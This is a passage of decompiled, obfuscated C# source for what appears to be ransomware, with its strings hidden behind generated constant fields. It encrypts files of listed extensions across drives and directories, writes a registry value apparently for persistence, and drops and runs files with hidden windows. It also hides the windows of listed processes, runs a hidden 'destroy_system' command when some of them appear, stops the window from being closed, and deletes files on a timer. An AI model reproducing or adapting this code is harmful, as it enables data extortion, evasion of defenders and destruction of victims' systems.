			array[_Constants_Generated_002D5.Field_515_002Dj8] = _Constants_Generated_002D5.Field_516_002Dk8;
			array[_Constants_Generated_002D5.Field_517_002Dl8] = _Constants_Generated_002D5.Field_518_002Dm8;
			array[_Constants_Generated_002D5.Field_519_002Dn8] = _Constants_Generated_002D5.Field_520_002Do8;
			array[_Constants_Generated_002D5.Field_521_002Dp8] = _Constants_Generated_002D5.Field_522_002Dq8;
			array[_Constants_Generated_002D5.Field_523_002Dr8] = _Constants_Generated_002D5.Field_524_002Ds8;
			array[_Constants_Generated_002D5.Field_525_002Dt8] = _Constants_Generated_002D5.Field_526_002Du8;
			array[_Constants_Generated_002D5.Field_527_002Dv8] = _Constants_Generated_002D5.Field_528_002Dw8;
			array[_Constants_Generated_002D5.Field_529_002Dx8] = _Constants_Generated_002D5.Field_530_002Dy8;
			array[_Constants_Generated_002D5.Field_531_002Dz8] = _Constants_Generated_002D5.Field_532_002DA8;
			array[_Constants_Generated_002D5.Field_533_002DB8] = _Constants_Generated_002D5.Field_534_002DC8;
			array[_Constants_Generated_002D5.Field_535_002DD8] = _Constants_Generated_002D5.Field_536_002DE8;
			array[_Constants_Generated_002D5.Field_537_002DF8] = _Constants_Generated_002D5.Field_538_002DG8;
			array[_Constants_Generated_002D5.Field_539_002DH8] = _Constants_Generated_002D5.Field_540_002DI8;
			array[_Constants_Generated_002D5.Field_541_002DJ8] = _Constants_Generated_002D5.Field_542_002DK8;
			array[_Constants_Generated_002D5.Field_543_002DL8] = _Constants_Generated_002D5.Field_544_002DM8;
			array[_Constants_Generated_002D5.Field_545_002DN8] = _Constants_Generated_002D5.Field_546_002DO8;
			array[_Constants_Generated_002D5.Field_547_002DP8] = _Constants_Generated_002D5.Field_548_002DQ8;
			array[_Constants_Generated_002D5.Field_549_002DR8] = _Constants_Generated_002D5.Field_550_002DS8;
			string[] source = array;
			string[] files = Directory.GetFiles(location_002D0);
			string[] directories = Directory.GetDirectories(location_002D0);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password_002D1);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				if (!directories[j].Contains(_Constants_Generated_002D5.Field_551_002DT8) && !directories[j].Contains(_Constants_Generated_002D5.Field_552_002DU8) && !directories[j].Contains(_Constants_Generated_002D5.Field_553_002DV8))
				{
					encryptDirectory(directories[j], password_002D1);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public void Encrypt()
	{
		string field_555_002DX = _Constants_Generated_002D5.Field_555_002DX8;
		string userName = Environment.UserName;
		string location_002D = field_555_002DX;
		string field_556_002DY = _Constants_Generated_002D5.Field_556_002DY8;
		string[] logicalDrives = Directory.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			if (text == _Constants_Generated_002D5.Field_557_002DZ8)
			{
				encryptDirectory(text, field_556_002DY);
			}
			else
			{
				encryptDirectory(location_002D, field_556_002DY);
			}
		}
		field_556_002DY = null;
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(_Constants_Generated_002D5.Field_558_002D09);
		registryKey.SetValue(_Constants_Generated_002D5.Field_559_002D19, temp_002D2 + _Constants_Generated_002D5.Field_560_002D29, RegistryValueKind.String);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = _Constants_Generated_002D5.Field_561_002D39;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = _Constants_Generated_002D5.Field_562_002D49;
		Process.Start(processStartInfo);
		string path = temp_002D2 + _Constants_Generated_002D5.Field_563_002D59;
		string[] array2 = new string[_Constants_Generated_002D5.Field_564_002D69];
		array2[0] = _Constants_Generated_002D5.Field_565_002D79;
		array2[1] = _Constants_Generated_002D5.Field_566_002D89;
		array2[2] = _Constants_Generated_002D5.Field_567_002D99;
		array2[3] = _Constants_Generated_002D5.Field_568_002Da9;
		array2[4] = _Constants_Generated_002D5.Field_569_002Db9;
		array2[5] = _Constants_Generated_002D5.Field_570_002Dc9;
		array2[6] = _Constants_Generated_002D5.Field_571_002Dd9;
		array2[7] = _Constants_Generated_002D5.Field_572_002De9;
		array2[8] = _Constants_Generated_002D5.Field_573_002Df9;
		array2[_Constants_Generated_002D5.Field_574_002Dg9] = _Constants_Generated_002D5.Field_575_002Dh9;
		array2[_Constants_Generated_002D5.Field_576_002Di9] = _Constants_Generated_002D5.Field_577_002Dj9;
		array2[_Constants_Generated_002D5.Field_578_002Dk9] = _Constants_Generated_002D5.Field_579_002Dl9;
		array2[_Constants_Generated_002D5.Field_580_002Dm9] = _Constants_Generated_002D5.Field_581_002Dn9;
		array2[_Constants_Generated_002D5.Field_582_002Do9] = _Constants_Generated_002D5.Field_583_002Dp9;
		array2[_Constants_Generated_002D5.Field_584_002Dq9] = _Constants_Generated_002D5.Field_585_002Dr9;
		array2[_Constants_Generated_002D5.Field_586_002Ds9] = _Constants_Generated_002D5.Field_587_002Dt9;
		array2[_Constants_Generated_002D5.Field_588_002Du9] = _Constants_Generated_002D5.Field_589_002Dv9;
		array2[_Constants_Generated_002D5.Field_590_002Dw9] = _Constants_Generated_002D5.Field_591_002Dx9;
		array2[_Constants_Generated_002D5.Field_592_002Dy9] = _Constants_Generated_002D5.Field_593_002Dz9;
		array2[_Constants_Generated_002D5.Field_594_002DA9] = _Constants_Generated_002D5.Field_595_002DB9;
		array2[_Constants_Generated_002D5.Field_596_002DC9] = _Constants_Generated_002D5.Field_597_002DD9;
		array2[_Constants_Generated_002D5.Field_598_002DE9] = _Constants_Generated_002D5.Field_599_002DF9;
		array2[_Constants_Generated_002D5.Field_600_002DG9] = _Constants_Generated_002D5.Field_601_002DH9;
		array2[_Constants_Generated_002D5.Field_602_002DI9] = _Constants_Generated_002D5.Field_603_002DJ9;
		array2[_Constants_Generated_002D5.Field_604_002DK9] = _Constants_Generated_002D5.Field_605_002DL9;
		array2[_Constants_Generated_002D5.Field_606_002DM9] = _Constants_Generated_002D5.Field_607_002DN9;
		array2[_Constants_Generated_002D5.Field_608_002DO9] = _Constants_Generated_002D5.Field_609_002DP9;
		array2[_Constants_Generated_002D5.Field_610_002DQ9] = _Constants_Generated_002D5.Field_611_002DR9;
		array2[_Constants_Generated_002D5.Field_612_002DS9] = _Constants_Generated_002D5.Field_613_002DT9;
		array2[_Constants_Generated_002D5.Field_614_002DU9] = _Constants_Generated_002D5.Field_615_002DV9;
		array2[_Constants_Generated_002D5.Field_616_002DW9] = _Constants_Generated_002D5.Field_617_002DX9;
		array2[_Constants_Generated_002D5.Field_618_002DY9] = _Constants_Generated_002D5.Field_619_002DZ9;
		array2[_Constants_Generated_002D5.Field_620_002D0a] = _Constants_Generated_002D5.Field_621_002D1a;
		array2[_Constants_Generated_002D5.Field_622_002D2a] = _Constants_Generated_002D5.Field_623_002D3a;
		string[] contents = array2;
		File.WriteAllLines(path, contents);
		Process.Start(temp_002D2 + _Constants_Generated_002D5.Field_624_002D4a);
		try
		{
			string path2 = field_555_002DX + userName + _Constants_Generated_002D5.Field_625_002D5a;
			string[] array3 = new string[_Constants_Generated_002D5.Field_626_002D6a];
			array3[0] = _Constants_Generated_002D5.Field_627_002D7a;
			array3[1] = _Constants_Generated_002D5.Field_628_002D8a;
			array3[2] = _Constants_Generated_002D5.Field_629_002D9a;
			array3[3] = _Constants_Generated_002D5.Field_630_002Daa;
			array3[4] = _Constants_Generated_002D5.Field_631_002Dba;
			array3[5] = _Constants_Generated_002D5.Field_632_002Dca;
			array3[6] = _Constants_Generated_002D5.Field_633_002Dda;
			array3[7] = _Constants_Generated_002D5.Field_634_002Dea;
			array3[8] = _Constants_Generated_002D5.Field_635_002Dfa;
			array3[_Constants_Generated_002D5.Field_636_002Dga] = _Constants_Generated_002D5.Field_637_002Dha;
			array3[_Constants_Generated_002D5.Field_638_002Dia] = _Constants_Generated_002D5.Field_639_002Dja;
			array3[_Constants_Generated_002D5.Field_640_002Dka] = _Constants_Generated_002D5.Field_641_002Dla;
			array3[_Constants_Generated_002D5.Field_642_002Dma] = _Constants_Generated_002D5.Field_643_002Dna;
			array3[_Constants_Generated_002D5.Field_644_002Doa] = _Constants_Generated_002D5.Field_645_002Dpa;
			array3[_Constants_Generated_002D5.Field_646_002Dqa] = _Constants_Generated_002D5.Field_647_002Dra;
			array3[_Constants_Generated_002D5.Field_648_002Dsa] = _Constants_Generated_002D5.Field_649_002Dta;
			array3[_Constants_Generated_002D5.Field_650_002Dua] = _Constants_Generated_002D5.Field_651_002Dva;
			array3[_Constants_Generated_002D5.Field_652_002Dwa] = _Constants_Generated_002D5.Field_653_002Dxa;
			array3[_Constants_Generated_002D5.Field_654_002Dya] = _Constants_Generated_002D5.Field_655_002Dza;
			array3[_Constants_Generated_002D5.Field_656_002DAa] = _Constants_Generated_002D5.Field_657_002DBa;
			array3[_Constants_Generated_002D5.Field_658_002DCa] = _Constants_Generated_002D5.Field_659_002DDa;
			array3[_Constants_Generated_002D5.Field_660_002DEa] = _Constants_Generated_002D5.Field_661_002DFa;
			array3[_Constants_Generated_002D5.Field_662_002DGa] = _Constants_Generated_002D5.Field_663_002DHa;
			array3[_Constants_Generated_002D5.Field_664_002DIa] = _Constants_Generated_002D5.Field_665_002DJa;
			array3[_Constants_Generated_002D5.Field_666_002DKa] = _Constants_Generated_002D5.Field_667_002DLa;
			array3[_Constants_Generated_002D5.Field_668_002DMa] = _Constants_Generated_002D5.Field_669_002DNa;
			array3[_Constants_Generated_002D5.Field_670_002DOa] = _Constants_Generated_002D5.Field_671_002DPa;
			array3[_Constants_Generated_002D5.Field_672_002DQa] = _Constants_Generated_002D5.Field_673_002DRa;
			array3[_Constants_Generated_002D5.Field_674_002DSa] = _Constants_Generated_002D5.Field_675_002DTa;
			array3[_Constants_Generated_002D5.Field_676_002DUa] = _Constants_Generated_002D5.Field_677_002DVa;
			array3[_Constants_Generated_002D5.Field_678_002DWa] = _Constants_Generated_002D5.Field_679_002DXa;
			array3[_Constants_Generated_002D5.Field_680_002DYa] = _Constants_Generated_002D5.Field_681_002DZa;
			array3[_Constants_Generated_002D5.Field_682_002D0b] = _Constants_Generated_002D5.Field_683_002D1b;
			array3[_Constants_Generated_002D5.Field_684_002D2b] = _Constants_Generated_002D5.Field_685_002D3b;
			string[] contents2 = array3;
			File.WriteAllLines(path2, contents2);
		}
		catch (Exception)
		{
		}
	}

	private void Form1_FormClosing_002D1(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void timer3_Tick_002D2(object sender, EventArgs e)
	{
		timer3_002D4.Stop();
		try
		{
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process in array)
			{
				if (process.ProcessName == _Constants_Generated_002D5.Field_686_002D4b)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_687_002D5b)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_688_002D6b)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_689_002D7b)
				{
					timer3_002D4.Stop();
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
					destroy_system();
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_690_002D8b)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_691_002D9b)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_692_002Dab)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_693_002Dbb)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_694_002Dcb)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_695_002Ddb)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_696_002Deb)
				{
					timer3_002D4.Stop();
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
					destroy_system();
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_697_002Dfb)
				{
					timer3_002D4.Stop();
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
					destroy_system();
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_698_002Dgb)
				{
					timer3_002D4.Stop();
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
					destroy_system();
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_699_002Dhb)
				{
					timer3_002D4.Stop();
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
					destroy_system();
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_700_002Dib)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
				if (process.ProcessName == _Constants_Generated_002D5.Field_701_002Djb)
				{
					int hwnd_002D = process.MainWindowHandle.ToInt32();
					ShowWindow(hwnd_002D, 0);
				}
			}
		}
		catch (Exception)
		{
		}
		timer3_002D4.Start();
	}

	public void destroy_system()
	{
		Process.EnterDebugMode();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = _Constants_Generated_002D5.Field_702_002Dkb;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = _Constants_Generated_002D5.Field_703_002Dlb;
		Process.Start(processStartInfo);
	}

	private void timer1_Tick_002D3(object sender, EventArgs e)
	{
		timer1_002D5.Stop();
		string field_704_002Dmb = _Constants_Generated_002D5.Field_704_002Dmb;
		string field_705_002Dnb = _Constants_Generated_002D5.Field_705_002Dnb;
		string field_706_002Dob = _Constants_Generated_002D5.Field_706_002Dob;
		string field_707_002Dpb = _Constants_Generated_002D5.Field_707_002Dpb;
		string field_708_002Dqb = _Constants_Generated_002D5.Field_708_002Dqb;
		if (File.Exists(field_704_002Dmb))
		{
			File.Delete(field_704_002Dmb);
		}
		if (File.Exists(field_705_002Dnb))
		{
			File.Delete(field_705_002Dnb);
		}
		if (File.Exists(field_706_002Dob))
		{
			File.Delete(field_706_002Dob);
		}
		if (File.Exists(field_707_002Dpb))
		{
			File.Delete(field_707_002Dpb);
		}
		if (File.Exists(field_708_002Dqb))
		{
			File.Delete(field_708_002Dqb);
		}
	}

	protected override void Dispose(bool disposing_002D0)
	{
		if (disposing_002D0 && components_002D3 != null)
		{
			components_002D3.Dispose();
		}
		((Form)this).Dispose(disposing_002D0);
	}

	private void InitializeComponent_002D4()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		components_002D3 = new Container();
		timer3_002D4 = new Timer(components_002D3);
		timer1_002D5 = new Timer(components_002D3);
		((Control)this).SuspendLayout();
		timer3_002D4.set_Enabled(true);
		timer3_002D4.set_Interval((int)_Constants_Generated_002D5.Field_709_002Drb);
		timer3_002D4.add_Tick((EventHandler)timer3_Tick_002D2);
		timer1_002D5.set_Enabled(true);
		timer1_002D5.set_Interval(_Constants_Generated_002D5.Field_710_002Dsb);
		timer1_002D5.add_Tick((EventHandler)timer1_Tick_002D3);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(_Constants_Generated_002D5.Field_711_002Dtb, _Constants_Generated_002D5.Field_712_002Dub));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_ClientSize(new Size(_Constants_Generated_002D5.Field_713_002Dvb, _Constants_Generated_002D5.Field_714_002Dwb));
		((Form)this).set_ControlBox(false);
		((Control)this).set_Name(_Constants_Generated_002D5.Field_715_002Dxb);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing_002D1));
		((Form)this).add_Load((EventHandler)Form1_Load_002D0);
		((Control)this).ResumeLayout(false);
	}
}
